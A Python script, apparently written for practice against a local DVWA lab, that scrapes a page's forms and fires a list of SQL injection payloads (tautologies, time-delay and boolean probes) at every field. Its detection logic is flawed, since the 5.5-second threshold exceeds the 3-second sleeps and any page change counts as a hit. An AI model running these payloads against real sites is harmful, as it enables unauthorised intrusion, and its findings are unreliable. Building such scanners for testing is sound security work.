import requests
from bs4 import BeautifulSoup
from bs4 import Comment
import sys
url=sys.argv[1]
#url='http://localhost/'
import json
from urllib.parse import urljoin
import time
import hashlib

s = requests.Session()
s.headers[
    "User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"

SQL_INJECTIONS = [
    "'",
    "`",
    "\"",
    "';",
    "\";",
    "'--",
    "\"--",
    "'#",
    "\"#",
    " OR 1=1--",
    "\" OR 1=1--",
    "' OR '1'='1",
    " OR 1=1#",
    "\" OR 1=1#",
    "' OR 1=1 #",
    "\" OR \"1\"=\"1",
    "-1 OR 1=1--",
    "-1\" OR 1=1--",
    "-1 OR 1=1#",
    "-1\" OR 1=1#",
    "-1 OR 1=1 #",
    "-1\" OR \"1\"=\"1",
    # Для времени
    '"; WAITFOR DELAY \'0:0:3\'--',
    '" WAITFOR DELAY \'0:0:3\'--',
    "' AND SLEEP(3)--",
    "' AND pg_sleep(3)--",
    '"; WAITFOR DELAY \'0:0:3\'#',
    '" WAITFOR DELAY \'0:0:3\'#',
    "' AND SLEEP(3)#",
    "' AND pg_sleep(3)#",
    # Для boolean
    "' AND 1=1--",
    "` AND 1=1--",
    "' AND 1=2--",
    "\" AND 1=1--",
    "\" AND 1=2--",
    "' AND 1=1#",
    "` AND 1=1#",
    "' AND 1=2#",
    "\" AND 1=1#",
    "\" AND 1=2#",
]
def normalize_html(html): #нормализация html кода перед хэшированием
    soup = BeautifulSoup(html, 'html.parser')
    # Удаление комментариев
    for comment in soup.findAll(string=lambda string: isinstance(string, Comment)):
        comment.extract()
    # Удаление скриптов
    for script in soup.find_all('script'):
        script.extract()
    # Удаление стилей
    for style in soup.find_all('style'):
        style.extract()
    # Удаление всех атрибутов (может не всегда нужно, но для упрощения сравнения)
    for tag in soup.find_all(True):
      tag.attrs = {}

    
    # Преобразование в нижний регистр и удаление лишних пробелов и новых строк
    normalized = str(soup).strip().lower()
    return " ".join(normalized.split())

def get_forms(url):
    try:
        soup = BeautifulSoup(s.get(url).content, "html.parser")
        # print(soup)
    except Exception as e:
        # print(f"Error fetching or parsing {url}: {e}")
        return []
    return soup.find_all("form")



def details_of_form(form):
    """Извлекает детали формы, включая input, select и textarea."""

    detailsOfForm = {}
    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()

    inputs = []

    # Обрабатываем input теги
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text").lower()
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})

    # Обрабатываем select теги
    for select_tag in form.find_all("select"):
        select_name = select_tag.attrs.get("name")
        inputs.append({"type": "select", "name": select_name,
                       "value": ""})
    # Обрабатываем textarea теги
    for textarea_tag in form.find_all("textarea"):
        textarea_name = textarea_tag.attrs.get("name")
        textarea_value = textarea_tag.text
        inputs.append({"type": "textarea", "name": textarea_name, "value": textarea_value})

    detailsOfForm["action"] = action
    detailsOfForm["method"] = method
    detailsOfForm["inputs"] = inputs
    return detailsOfForm




def analyze_response(response, start_time, baseline_hash, blind_type=None):
    elapsed_time = time.time() - start_time

    if response is None:
        return False

    if blind_type == "time":
        if elapsed_time >= 5.5:  # Если задержка более 5.5 секунд, то считаем уязвимым
            return True
        else:
            return False
    elif blind_type == "boolean":
        normalized_html = normalize_html(response.content)
        current_hash = hashlib.md5(normalized_html.encode('utf-8')).hexdigest()
        if current_hash != baseline_hash:
            return True
        else:
            return False

    return False  # Если это не "blind_test", то возвращаем False (это не уязвимо)


def sql_injection_scan(url):
    forms = get_forms(url)
    # print(f"[+] Detected {len(forms)} forms on {url}.")
    answer=[]
    for form in forms:
        details = details_of_form(form)
        # Создаем "базовый" запрос, без инъекций, для сравнения
        baseline_data = {}
        for input_tag in details["inputs"]:
            if input_tag["type"] != "submit":
                baseline_data[input_tag["name"]] = "test"
            elif input_tag["type"] == "hidden" and input_tag["value"]:
                baseline_data[input_tag["name"]] = input_tag["value"]

        baseline_url = urljoin(url, details["action"])

        try:
            if details["method"] == "post":
                baseline_res = s.post(baseline_url, data=baseline_data)
            elif details["method"] == "get":
                # print(baseline_data)
                baseline_res = s.get(baseline_url, params=baseline_data)
        except Exception as e:
            # print(f"Error sending initial request to {baseline_url}: {e}")
            continue

        if baseline_res is None:
            # print(f"Skipping form at {baseline_url}: could not get baseline response.")
            continue
        normalized_html = normalize_html(baseline_res.content)
        # baseline_hash = hashlib.md5(baseline_res.content).hexdigest()
        baseline_hash = hashlib.md5(normalized_html.encode('utf-8')).hexdigest()
        payloads=[]
        for injection in SQL_INJECTIONS:
            data = {}
            for input_tag in details["inputs"]:
                if input_tag["type"] == "hidden" or input_tag["value"]:
                    data[input_tag["name"]] = input_tag["value"] + injection
                elif input_tag["type"] != "submit":
                    data[input_tag["name"]] = f"{injection}"

            url_to_submit = urljoin(url, details["action"])
            start_time = time.time()

            try:
                if details["method"] == "post":
                    res = s.post(url_to_submit, data=data)
                elif details["method"] == "get":
                    res = s.get(url_to_submit, params=data)
            except Exception as e:
                # print(f"Error sending injection request to {url_to_submit}: {e}")
                continue

            # if res is not None and analyze_response(res, start_time, baseline_hash):
            #     # print(f"[!] Possible SQL Injection vulnerability detected at {details} with payload: {injection}")
            #     payloads.append(injection)
            #el
            if res is not None and analyze_response(res, start_time, baseline_hash, "time"):
                # print(f"[!] Possible Time-based Blind SQL Injection vulnerability detected at {details} with payload: {injection}")
                payloads.append(injection)
            elif res is not None and analyze_response(res, start_time, baseline_hash, "boolean"):
                # print(f"[!] Possible SQL Injection vulnerability detected at {details} with payload: {injection}")
                payloads.append(injection)
            # else:
            #     print(f"[-] No SQL Injection vulnerability detected with payload: {injection}")
        answer.append([details, payloads])
    return json.dumps(answer)


#if __name__ == "__main__":
    # url_arg = "https://www.geeksforgeeks.org/python-programming-language/"  # Replace with your URL
    #'http://localhost/dvwa/vulnerabilities/sqli/' - url с sql injection
    #url='http://localhost/'
    #url_arg = url
#url='http://localhost:4000/'
print(sql_injection_scan(url))